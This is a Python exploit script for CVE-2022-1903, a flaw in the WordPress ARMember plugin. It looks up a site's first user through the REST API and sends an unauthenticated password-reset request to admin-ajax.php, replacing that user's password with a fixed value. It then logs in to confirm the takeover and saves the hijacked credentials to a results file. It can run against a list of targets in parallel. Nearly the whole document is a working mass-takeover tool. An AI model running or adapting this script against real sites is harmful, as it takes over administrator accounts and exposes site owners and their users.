# @author : biulove0x
# @name   : WP Plugins ARMember Exploiter
from urllib3.exceptions import InsecureRequestWarning
import concurrent.futures
import requests, re, argparse, json

print(
'''
###########################################
# @author : biulove0x                     #
# @name   : WP Plugins ARMember Exploiter #
# @cve    : CVE-2022-1903                 #
###########################################
''')

def armember(_target, _timeout=5):
    global _headers, _cookies
    _sessionget = requests.Session()

    def save_result(_result):
        _saved = open('RESULT-WPAR.txt', 'a+')
        _saved.write(_result + '\n')
    
    try:
        _getuser =_sessionget.get(url=_target + 'wp-json/wp/v2/users/', headers=_headers, allow_redirects=True, verify=False, timeout=_timeout)
        _resuser = json.loads(_getuser.text)
        _fonuser = _resuser[0]['slug']
        _payload = 'action=arm_shortcode_form_ajax_action&user_pass=biulove0x&repeat_pass=biulove0x&arm_action=change-password&key2=x&action2=rp&login2=' + _fonuser
        
        _exploit = _sessionget.post(url=_target + 'wp-admin/admin-ajax.php', headers=_headers, data=_payload, allow_redirects=True, verify=False, timeout=_timeout)        
        if 200 == _exploit.status_code:
            # Try login
            _datalog = { 'log' : _fonuser, 'pwd' : 'biulove0x', 'wp-submit' : 'Login', 'redirect_to' : _target + 'wp-admin/', 'testcookie' : 1 }
            _validationLogin = _sessionget.post(url=_target + 'wp-login.php', data=_datalog, cookies=_cookies, allow_redirects=True, verify=False)
            if 'wp-admin/profile.php' in _validationLogin.text:
                print('[-] ' + _target + 'wp-admin/ => Success')
                save_result(_target + 'wp-login.php > ' + _fonuser + ' | biulove0x')
            else:
                print('[+] ' + _target + ' Not found!')
    except:
        print('[%] ' + _target + ' Requests failed')

def main(_choose, _target):
    if _choose == 1:
        armember(_target)

    elif _choose == 2:
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            _ur_list = open(_target, 'r').read().split()
            _futures = []

            for _url in _ur_list:
                _futures.append(executor.submit(armember, _target=_url))

            for _future in concurrent.futures.as_completed(_futures):
                if(_future.result() is not None):
                    print(_future.result())
    else:
        exit()
        
## SSL Bypass
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

## Setup args
_parser = argparse.ArgumentParser(description='CVE-2022-1903 [ ARMember < 3.4.8 - Unauthenticated Admin Account Takeover ]')
_parser.add_argument('-t', metavar='example.com', type=str, help='Single target')
_parser.add_argument('-l', metavar='target.txt', type=str, help='Multiple target')
_args = _parser.parse_args()

## Variable args
_singleTarget = _args.t
_multiTarget  = _args.l

## Variable 
_cookies = { 'wordpress_test_cookie' : 'WP+Cookie+check' }
_headers = { 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded' }

if __name__ == '__main__':
    if not _singleTarget == None:
        _choose = 1
        main(_choose, _singleTarget)
    elif not _multiTarget == None:
        _choose = 2
        main(_choose, _multiTarget)
    else:
        print('ARMember.py --help for using tools')
